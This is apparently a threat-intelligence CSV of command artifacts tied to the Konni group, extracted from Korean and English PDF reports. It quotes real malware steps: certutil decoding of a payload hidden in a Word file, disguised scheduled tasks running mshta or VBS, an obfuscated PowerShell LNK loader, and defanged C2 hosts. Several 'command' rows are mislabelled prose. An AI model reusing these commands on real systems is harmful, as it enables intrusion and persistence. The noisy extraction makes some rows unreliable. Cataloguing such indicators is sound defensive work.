schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:774a8224b340fd578876461a9d12e0b5373c51989524080c70d5ce266a5b2576,observation--sha256:ccfb4932a8763a7996762f7d6381a5336370e8863d33db39e6c160e0cfb1d97f,command,c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7,c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:d8cc79390679c979825235ef4d0badcf677507645323284811785fe42dfb34ee,observation--sha256:608cd14d78a764ced8268a567580f3e31deafc712518aab78caf49895528d7da,command,c. ‘rundll32.exe’로 파일 실행,c. ‘rundll32.exe’로 파일 실행,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:9f0719b3ab353a8edc44733fb8a0632d215ee37d17b27ea56e1efe7a96b76366,observation--sha256:43e2fc4015bcaf368d34f95cf73889468ea2d000d7cf94d37826f45d071c6c57,command,"certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which","certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which",candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:8d398f925d932b6545705c88be7d1a19308522698318fb7c4a4215dd75732aa5,observation--sha256:c38192f05d917aae63a551f274546273503385ae67417cb7f9a66cb306cdeb9a,command,cmd /c schtasks /create /sc minute /mo 15 /tn “Twitter Alarm” /tr “mshta,cmd /c schtasks /create /sc minute /mo 15 /tn “Twitter Alarm” /tr “mshta,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable 2021 Malware Campaigns March 2021 In March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email. Messages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of Korea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise missile tests that occurred on or around March 21, 2021. Figure 30. Phishing message with UR",
1.0.0,actor--konni,artifact--sha256:f1fb76006625a92545076cb1a0b15d0c1df445677f8f109548efa4c4415a3ac2,observation--sha256:d20845c2a380a445f0079c04b1cc0afee11b920e2af8131a46b38a047ba32790,command,"pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini)","pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:9f5a0fdbcabb133e51d0bef551fb2dcc320ebbc599dfca7bba2c50068df18813,observation--sha256:a9b1affdb1c94ff9c755a5b23b032966ff6efee287aa105f330f06c010e1542a,command,task with a name of “Twitter Alarm” that executed every 15 minutes and used Mshta to download a payload from an actor-,task with a name of “Twitter Alarm” that executed every 15 minutes and used Mshta to download a payload from an actor-,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable 2021 Malware Campaigns March 2021 In March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email. Messages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of Korea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise missile tests that occurred on or around March 21, 2021. Figure 30. Phishing message with UR",
1.0.0,actor--konni,artifact--sha256:449ef46ebde45555b63137333a963404b458168e6384b51c0193ce2827520af5,observation--sha256:c16acca1e82f099f46ee27a725d25f4e077c03ef5a17c91bef384a69a1ccee3d,command,○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상,○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:86a8088efda9a1d874248edaba6cc6dbe1047825390c881352565289bbcd63ff,observation--sha256:a9e6f5587fa98ad970d8d32a8589301526f3e348ad66f5b7186c48e013ef729f,command,"○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell","○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 40 b. Genian EDR 제품을 통한 효과적인 대응 ○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell 행위 이벤트와 흐름을 빠르고 정확히 탐지할 수 있도록 가시성을 제공합니다. 코니의 이상행위 위협 이벤트를 시각화하여 단계별 흐름을 신속하게 파악할 수 있습니다. ○ 본 보고서에서 기술한 코니 시리즈는 지난 수년간 한국의 엔드포인트 상대로 지속적인 공격을 수행하고 있습니다. 이에 보다 효과적인 대응을 위해 Genian EDR 솔루션과 같은 행위 기반 탐지 기술로 선제적 차단 방안이 요구됩니다. ○ 아울러 비정상적 프로세스 행위를 실시간으로 모니터링하고, 신뢰할 수 없는 이메일의 첨부 파일에 함부로 접근하지 않는 보안 의식도 중요합니다. 특히, 현재 성행하고 있는 LNK 유형의 악성 파일에 노출되지 않기 위해 압축 파일의 경우 작",
1.0.0,actor--konni,artifact--sha256:e7e6b67f956ddf94b4a0ddb6b8dc49d67569a9a50c77a389c9513d4aad8a68a6,observation--sha256:b128e0d93bc112138e236a49036e701da6b4b8decbb44c63b700f1ed1ef5bc5d,command,"○ LNK 내부의 Powershell 명령을 통해'230823- 협의회참여단체현황. xlsx' 정상문서를임시경로( Temp) 에생성하고실행합니다. 실제참여단체현황정보가포함되어있어, 사전에유출된정상문서가본공격에도용된것으로추정됩니다.","○ LNK 내부의 Powershell 명령을 통해'230823- 협의회참여단체현황. xlsx' 정상문서를임시경로( Temp) 에생성하고실행합니다. 실제참여단체현황정보가포함되어있어, 사전에유출된정상문서가본공격에도용된것으로추정됩니다",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:7d3373840f2954b74d858fdb5807b74b636e0519cac7b5171644b29315087f8d,observation--sha256:6523378269e2ae9f7c08da8432da82e423db562c8413a617eeb28b3ab929b539,command,"○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어","○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
